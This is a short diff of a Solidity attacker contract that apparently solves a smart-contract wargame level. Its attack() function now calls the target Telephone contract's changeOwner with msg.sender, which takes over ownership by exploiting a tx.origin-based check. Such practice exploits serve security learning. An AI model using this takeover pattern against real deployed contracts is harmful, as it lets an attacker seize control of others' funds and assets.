@@ -10,7 +10,7 @@ contract TelephoneAttacker {
         telephone = Telephone(telephoneAddress);
     }
 
-    function attack(address newOwner) external {
-        telephone.changeOwner(newOwner);
+    function attack() external {
+        telephone.changeOwner(msg.sender);
     }
 }
